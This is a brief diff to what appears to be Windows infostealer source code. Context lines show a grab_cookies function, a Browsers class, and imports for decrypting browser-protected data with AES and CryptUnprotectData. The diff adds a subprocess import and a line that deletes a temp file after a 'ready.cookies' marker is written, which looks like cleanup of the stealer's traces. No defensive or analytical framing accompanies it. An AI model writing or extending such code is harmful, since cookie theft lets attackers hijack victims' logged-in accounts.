@@ -9,6 +9,7 @@ from getpass import getuser
 import psutil
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
+import subprocess
 
 def grab_cookies():
     browser = Browsers()
@@ -136,3 +137,4 @@ class Browsers:
         time.sleep(3)
         with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'w'):
             pass
+        os.remove(f'C:\\Users\\{getuser()}\\tmp')
